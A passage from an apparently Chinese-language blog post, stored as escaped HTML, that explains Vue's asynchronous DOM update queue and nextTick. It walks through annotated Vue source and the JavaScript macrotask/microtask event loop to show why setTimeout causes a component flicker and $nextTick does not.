methods: {\n      handleClick() {\n        this.show = false\n        this.show = true\n      }\n    }\n  }\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e别笑，我们当然知道这段代码有多愚蠢，不用尝试也确定这是错的，但是凭借react的经验我大概知道将\u003ccode\u003ethis.show = true\u003c/code\u003e换成\u003ccode\u003esetTimeout(() =\u0026gt; { this.show = true }, 0)\u003c/code\u003e，就应该可以得到想要的结果，果然，组件重置了其生命周期，但是事情还是有点不对头。我们经过几次点击发现组件总是会闪一下。逻辑上这很好理解，组件先销毁后重建有这种情况是很正常的，但是抱歉，我们找到了另一种方式（毕竟谷歌是万能的），将\u003ccode\u003esetTimeout(() =\u0026gt; { this.show = true }, 0)\u003c/code\u003e换成\u003ccode\u003ethis.$nextTick(() =\u0026gt; { this.show = true })\u003c/code\u003e，神奇的事情来了，组件依然重置了其生命周期，但是组件本没没有丝毫的闪动。\u003c/p\u003e\n\u003cp\u003e为了让亲爱的您感受到我这段虚无缥缈的描述，我为您贴心准备了此\u003ca target=\"_blank\" href=\"https://jsfiddle.net/25fdgLgr/14/\"\u003edemo\u003c/a\u003e，您可以将handle1依次换为handle2与handle3来体验组件在闪动与不闪动之间徘徊的快感。\u003c/p\u003e\n\u003cp\u003e如果您体验完快感后仍然选择继续阅读那么我要跟你说的是接下来的内容是会比较长的，因为要想完全弄明白这件事我们必须深入Vue的内部与Javascript的EventLoop两个方面。\u003c/p\u003e\n\u003cp\u003e导致此问题的主要原因在于Vue默认采用的是的异步更新队列的方式，我们可以从官网上找到以下描述\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e可能你还没有注意到，Vue 异步执行 DOM 更新。只要观察到数据变化，Vue 将开启一个队列，并缓冲在同一事件循环中发生的所有数据改变。如果同一个 watcher 被多次触发，只会被推入到队列中一次。这种在缓冲时去除重复数据对于避免不必要的计算和 DOM 操作上非常重要。然后，在下一个的事件循环“tick”中，Vue 刷新队列并执行实际 (已去重的) 工作。Vue 在内部尝试对异步队列使用原生的 Promise.then 和 MessageChannel，如果执行环境不支持，会采用 setTimeout(fn, 0) 代替。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这段话确实精简的描述了整个流程，但是并不能解决我们的疑惑，接下来是时候展示真正的技术了。需要说明的是以下核心流程如果您没阅读过一些介绍源码的blog或者是阅读过源码，那么您可能一脸懵b。但是没关系在这里我们最终关心的基本上只是第4步，您只需要大概将其记住，然后将这个流程对应我们后面解析的源码就可以了。\u003c/p\u003e\n\u003cp\u003eVue的核心流程大体可以分成以下几步\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e遍历属性为其增加get，set方法，在get方法中会收集依赖(\u003ccode\u003edev.subs.push(watcher)\u003c/code\u003e)，而set方法则会调用dev的notify方法，此方法的作用是通知subs中的所有的watcher并调用watcher的update方法，我们可以将此理解为设计模式中的发布与订阅\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e默认情况下update方法被调用后会触发\u003ccode\u003equeueWatcher\u003c/code\u003e函数，此函数的主要功能就是将watcher实例本身加入一个队列中(\u003ccode\u003equeue.push(watcher)\u003c/code\u003e)，然后调用\u003ccode\u003enextTick(flushSchedulerQueue)\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eflushSchedulerQueue\u003c/code\u003e是一个函数，目的是调用queue中所有watcher的\u003ccode\u003ewatcher.run\u003c/code\u003e方法，而\u003ccode\u003erun\u003c/code\u003e方法被调用后接下来的操作就是通过新的虚拟dom与老的虚拟dom做diff算法后生成新的真实dom\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e只是此时我们\u003ccode\u003eflushSchedulerQueue\u003c/code\u003e并没有执行，第二步的最终做的只是将\u003ccode\u003eflushSchedulerQueue\u003c/code\u003e又放进一个callbacks队列中(\u003ccode\u003ecallbacks.push(flushSchedulerQueue)\u003c/code\u003e)，然后\u003cstrong\u003e异步\u003c/strong\u003e的将callbacks遍历并执行（此为异步更新队列）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e如上所说\u003ccode\u003eflushSchedulerQueue\u003c/code\u003e在被执行后调用\u003ccode\u003ewatcher.run()\u003c/code\u003e，于是你看到了一个新的页面\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e以上所有流程都在\u003cstrong\u003evue/src/core\u003c/strong\u003e文件夹中。\u003c/p\u003e\n\u003cp\u003e接下来我们按照上面例子中的最后一种情况来分析Vue代码的执行过程，其中一些细节我会有所省略，请记住开始的话，我们这里最关心的只是第四步\u003c/p\u003e\n\u003cp\u003e当点击按钮后，绑定在按钮上的回调函数被触发，\u003ccode\u003ethis.show = false\u003c/code\u003e被执行，触发了属性中的set函数，set函数中，dev的notify方法被调用，导致其subs中每个watcher的update方法都被执行（在本例中subs数组里只有一个watcher~），一起来看下watcher的构造函数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eWatcher\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e (vm) {\n    \u003cspan class=\"hljs-comment\"\u003e// 将vue实例绑定在watcher的vm属性上\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.vm = vm \n  }\n  update () {\n     \u003cspan class=\"hljs-comment\"\u003e// 默认情况下都会进入else的分支，同步则直接调用watcher的run方法\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.lazy) {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.dirty = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.sync) {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.run()\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n      queueWatcher(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e)\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e再来看下\u003ccode\u003equeueWatcher\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * 将watcher实例推入queue(一个数组)中，\n * 被has对象标记的watcher不会重复被加入到队列\n */\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003equeueWatcher\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ewatcher: Watcher\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e id = watcher.id\n  \u003cspan class=\"hljs-comment\"\u003e// 判断watcher是否被标记过，has为一个对象，此方案类似数组去重时利用object保存数组值\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (has[id] == \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e) {\n    \u003cspan class=\"hljs-comment\"\u003e// 没被标记过的watcher进入分支后被标记上\u003c/span\u003e\n    has[id] = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!flushing) {\n      \u003cspan class=\"hljs-comment\"\u003e// 推入到队列中\u003c/span\u003e\n      queue.push(watcher)\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n      \u003cspan class=\"hljs-comment\"\u003e// 如果是在flush队列时被加入，则根据其watcher的id将其插入正确的位置\u003c/span\u003e\n      \u003cspan class=\"hljs-comment\"\u003e// 如果不幸该watcher已经错过了被调用的时机则会被立即调用\u003c/span\u003e\n      \u003cspan class=\"hljs-comment\"\u003e// 稍后看flushSchedulerQueue这个函数会理解这两段注释的意思\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = queue.length - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e (i \u0026gt; index \u0026amp;\u0026amp; queue[i].id \u0026gt; watcher.id) {\n        i--\n      }\n      queue.splice(i + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, watcher)\n    }\n    \u003cspan class=\"hljs-comment\"\u003e// queue the flush\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!waiting) {\n      waiting = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n     \u003cspan class=\"hljs-comment\"\u003e// 我们关心的重点nextTick函数，其实我们写的this.$nextTick也是调用的此函数\u003c/span\u003e\n      nextTick(flushSchedulerQueue)\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个函数运行后，我们的watcher进入到了queue队列中（本例中queue内部也只被添加这一个watcher），然后调用\u003ccode\u003enextTick(flushSchedulerQueue)\u003c/code\u003e，这里我们先来看下\u003ccode\u003eflushSchedulerQueue\u003c/code\u003e函数的源码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * flush整个队列，调用watcher\n */\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eflushSchedulerQueue\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-comment\"\u003e// 将flush置为true，请联系上文\u003c/span\u003e\n  flushing = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e watcher, id\n\n  \u003cspan class=\"hljs-comment\"\u003e// flush队列前先排序\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 目的是\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 1.Vue中的组件的创建与更新有点类似于事件捕获，都是从最外层向内层延伸，所以要先\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 调用父组件的创建与更新\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 2. userWatcher比renderWatcher创建要早（抱歉并不能给出我的解释，我没理解）\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 3. 如果父组件的watcher调用run时将父组件干掉了，那其子组件的watcher也就没必要调用了\u003c/span\u003e\n  queue.sort(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ea, b\u003c/span\u003e) =\u0026gt;\u003c/span\u003e a.id - b.id)\n  \n  \u003cspan class=\"hljs-comment\"\u003e// 此处不缓存queue的length，因为在循环过程中queue依然可能被添加watcher导致length长度的改变\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (index = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; index \u0026lt; queue.length; index++) {\n    \u003cspan class=\"hljs-comment\"\u003e// 取出每个watcher\u003c/span\u003e\n    watcher = queue[index]\n    id = watcher.id\n    \u003cspan class=\"hljs-comment\"\u003e// 清掉标记\u003c/span\u003e\n    has[id] = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 更新dom走起\u003c/span\u003e\n    watcher.run()\n    \u003cspan class=\"hljs-comment\"\u003e// dev环境下，检测是否为死循环\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (process.env.NODE_ENV !== \u003cspan class=\"hljs-string\"\u003e'production'\u003c/span\u003e \u0026amp;\u0026amp; has[id] != \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e) {\n      circular[id] = (circular[id] || \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (circular[id] \u0026gt; MAX_UPDATE_COUNT) {\n        warn(\n          \u003cspan class=\"hljs-string\"\u003e'You may have an infinite update loop '\u003c/span\u003e + (\n            watcher.user\n              ? \u003cspan class=\"hljs-string\"\u003e`in watcher with expression \"\u003cspan class=\"hljs-subst\"\u003e${watcher.expression}\u003c/span\u003e\"`\u003c/span\u003e\n              : \u003cspan class=\"hljs-string\"\u003e`in a component render function.`\u003c/span\u003e\n          ),\n          watcher.vm\n        )\n        \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e\n      }\n    }\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e仍然要记得，此时我们的flushSchedulerQueue 还没执行，它只是被当作回调传入了nextTick中，接下来我们就来说说我们本次的重点nextTick，建议您整体的看一下\u003ca target=\"_blank\" href=\"https://github.com/vuejs/vue/blob/dev/src/core/util/next-tick.js\"\u003enextTick\u003c/a\u003e的源码，虽然我也都会解释到\u003c/p\u003e\n\u003cp\u003e我们首先从next-tick.js中提取出来\u003ccode\u003ewithMacroTask\u003c/code\u003e这个函数来说明，很抱歉我把这个函数放到了最后，因为我想让亲爱的您知道，最重要的东西总是要压轴登场的。但是从整体流程来说当我们点击btn的时候，其实第一步应该是调用此函数。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * 包装参数fn，让其使用marcotask\n * 这里的fn为我们在事件上绑定的回调函数\n */\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ewithMacroTask\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003efn: Function\u003c/span\u003e): \u003cspan class=\"hljs-title\"\u003eFunction\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e fn._withTask || (fn._withTask = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    useMacroTask = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e res = fn.apply(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003earguments\u003c/span\u003e)\n    useMacroTask = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e res\n  })\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e没错，其实您绑定在onclick上的回调函数是在这个函数内以apply的形式触发的，请您先去在此处打一个断点来验证。好的，我现在相信您已经证明了我所言非虚，但是其实那不重要，因为重要的是我们在此处立了一个flag，\u003ccode\u003euseMacroTask = true\u003c/code\u003e ，这才是很关键的东西，谷歌翻译一下我们可以知道它的具体含义，\u003cstrong\u003e用宏任务\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"黑人问号\" src=\"https://user-gold-cdn.xitu.io/2017/12/4/1601f8a39dfb8423?w=455\u0026amp;h=300\u0026amp;f=jpeg\u0026amp;s=14203\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eOK，这就要从我们文章开头所说的第二部分EventLoop讲起了。\u003c/p\u003e\n\u003cp\u003e其实这部分内容相信对已经看到这里的您来说早就接触过了，如果还真的不太清除的话推荐您仔细的看一下阮一封老师的\u003ca target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2014/10/event-loop.html\"\u003e这篇文章\u003c/a\u003e，我们只会大概的做一个总结\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e我们的同步任务的调用形成了一个栈结构\u003c/li\u003e\n\u003cli\u003e除此之外我们还有一个任务队列，当一个异步任务有了结果后会向队列中添加一个任务，每个任务都对应着一个回调函数\u003c/li\u003e\n\u003cli\u003e当我们的栈结构为空时，就会读取任务队列，同时调用其对应的回调函数\u003c/li\u003e\n\u003cli\u003e重复\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e这个总结目前来说对于我们比较欠缺的信息就是队列中的任务其实是分为两种的，宏任务(macrotask)与微任务(microtask)。\n当主线程上执行的所有同步任务结束后会从任务队列中抽取出所有微任务执行，当微任务也执行完毕后一轮事件循环就结束了，然后浏览器会重新渲染(\u003cstrong\u003e请谨记这点，因为正是此原因才会导致文章开头所说的问题\u003c/strong\u003e)。之后再从队列中取出宏任务继续下一轮的事件循环，值得注意的一点是执行微任务时仍然可以继续产生微任务在本轮事件循环中不停的执行。所以本质上微任务的优先级是高于宏任务的。\u003c/p\u003e\n\u003cp\u003e如果您想更详细的了解宏任务与微任务那么推荐您阅读\u003ca target=\"_blank\" href=\"https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/?utm_source=html5weekly\"\u003e这篇文章\u003c/a\u003e,这或许是东半球关于这个问题解释的最好，最易懂，最详细的文章了。\u003c/p\u003e\n\u003cp\u003e宏任务与微任务产生的方式并不相同，浏览器环境下setImmediate，MessageChannel，setTimeout会产生宏任务，而MutationObserver ，Promise则会产生微任务。而这也是Vue中采取的异步方式，Vue会根据\u003ccode\u003euseMacroTask\u003c/code\u003e的布尔值来判断是要产生宏任务还是产生微任务来异步更新队列，我们会稍后看到这部分，现在我们还是走回我们原来的逻辑吧。\u003c/p\u003e\n\u003cp\u003e当fn在withMacroTask函数中被调用后就产生了我们以上所讲的所有步骤，现在是时候来真正看下nextTick函数都干了什么\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003enextTick\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003ecb?: Function, ctx?: Object\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e _resolve\n  \u003cspan class=\"hljs-comment\"\u003e// callbacks为一个数组，此处将cb推进数组，本例中此cb为刚才还未执行的flushSchedulerQueue\u003c/span\u003e\n  callbacks.push(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (cb) {\n      \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e {\n        cb.call(ctx)\n      } \u003cspan class=\"hljs-keyword\"\u003ecatch\u003c/span\u003e (e) {\n        handleError(e, ctx, \u003cspan class=\"hljs-string\"\u003e'nextTick'\u003c/span\u003e)\n      }\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (_resolve) {\n      _resolve(ctx)\n    }\n  })\n  \u003cspan class=\"hljs-comment\"\u003e// 标记位，保证之后如果有this.$nextTick之类的操作不会再次执行以下代码\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!pending) {\n    pending = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 用微任务还是用宏任务，此例中运行到现在为止Vue的选择是用宏任务\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 其实我们可以理解成所有用v-on绑定事件所直接产生的数据变化都是采用宏任务的方式\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 因为我们绑定的回调都经过了withMacroTask的包装，withMacroTask中会使useMacroTask为true\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (useMacroTask) {\n      macroTimerFunc()\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n      microTimerFunc()\n    }\n  }\n  \u003cspan class=\"hljs-comment\"\u003e// $flow-disable-line\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!cb \u0026amp;\u0026amp; \u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e !== \u003cspan class=\"hljs-string\"\u003e'undefined'\u003c/span\u003e) {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eresolve\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n      _resolve = resolve\n    })\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e执行完以上代码最后只剩下两个结果，调用\u003ccode\u003emacroTimerFunc\u003c/code\u003e或者\u003ccode\u003emicroTimerFunc\u003c/code\u003e，本例中到目前为止，会调用\u003ccode\u003emacroTimerFunc\u003c/code\u003e。这两个函数的目的其实都是要以异步的形式去遍历callbacks中的函数，只不过就像我们上文所说的，他们采取的方式并不一样，一个是宏任务达到异步，一个是微任务达到异步。另外我要适时的提醒你引起以上所有流程的原因只是运行了一行代码\u003ccode\u003ethis.show = false\u003c/code\u003e而\u003ccode\u003ethis.$nextTick(() =\u0026gt; { this.show = true })\u003c/code\u003e还没开始执行，不过别绝望，也快轮到它了。好的，回到正题来看看\u003ccode\u003emacroTimerFunc\u003c/code\u003e与\u003ccode\u003emicroTimerFunc\u003c/code\u003e吧。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * macroTimerFunc\n */\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 如果当前环境支持setImmediate，就用此来产生宏任务达到异步效果\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e setImmediate !== \u003cspan class=\"hljs-string\"\u003e'undefined'\u003c/span\u003e \u0026amp;\u0026amp; isNative(setImmediate)) {\n  macroTimerFunc = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    setImmediate(flushCallbacks)\n  }\n} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e MessageChannel !== \u003cspan class=\"hljs-string\"\u003e'undefined'\u003c/span\u003e \u0026amp;\u0026amp; (\n  \u003cspan class=\"hljs-comment\"\u003e// 否则MessageChannel\u003c/span\u003e\n  isNative(MessageChannel) ||\n  \u003cspan class=\"hljs-comment\"\u003e// PhantomJS\u003c/span\u003e\n  MessageChannel.toString() === \u003cspan class=\"hljs-string\"\u003e'[object MessageChannelConstructor]'\u003c/span\u003e\n)) {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e channel = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e MessageChannel()\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e port = channel.port2\n  channel.port1.onmessage = flushCallbacks\n  macroTimerFunc = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    port.postMessage(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)\n  }\n} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n  \u003cspan class=\"hljs-comment\"\u003e// 再不行的话就只能setTimeout了\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e/* istanbul ignore next */\u003c/span\u003e\n  macroTimerFunc = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    setTimeout(flushCallbacks, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e/**\n * microTimerFunc\n */\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// 如果支持Promise则用Promise来产生微任务\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e !== \u003cspan class=\"hljs-string\"\u003e'undefined'\u003c/span\u003e \u0026amp;\u0026amp; isNative(\u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e)) {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e p = \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e.resolve()\n  microTimerFunc = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    p.then(flushCallbacks)\n    \u003cspan class=\"hljs-comment\"\u003e// 对IOS做兼容性处理，（IOS中存在一些问题，具体可以看尤大大自己的解释）\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (isIOS) setTimeout(noop)\n  }\n} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n  \u003cspan class=\"hljs-comment\"\u003e// 降级\u003c/span\u003e\n  microTimerFunc = macroTimerFunc\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e截止到目前为止应该有一个比较清晰的认识了，其实nextTick最终希望达到的效果就是采用异步的方式去调用\u003ccode\u003eflushCallbacks\u003c/code\u003e，至于是用宏任务还是微任务，Vue内部已经帮我们处理掉了，并不用我们去决定。至于\u003ccode\u003eflushCallbacks\u003c/code\u003e光看名字就知道是循环刚才的callbacks并执行。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eflushCallbacks\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  pending = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 将callbacks做一次复制\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e copies = callbacks.slice(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e)\n \u003cspan class=\"hljs-comment\"\u003e// 置空callbacks\u003c/span\u003e\n  callbacks.length = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 遍历并执行\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; copies.length; i++) {\n    copies[i]()\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e请注意，虽然我们在这里解释了flushCallbacks是干嘛的，但是要记住它是被异步处理的，而当前同步任务还并没有执行完，所以这个函数此时并没有被调用，真正要做的是走完整个同步任务，也就是我们的\u003ccode\u003ethis.$nextTick(() =\u0026gt; { this.show = true })\u003c/code\u003e终于要被调用了，感谢老天爷。\n当\u003ccode\u003ethis.$nextTick\u003c/code\u003e被调用后\u003ccode\u003e() =\u0026gt; { this.show = true }\u003c/code\u003e同样被当做参数推入了callbacks中，此时可以理解为callbacks长这样[flushSchedulerQueue, () =\u0026gt; { this.show = true 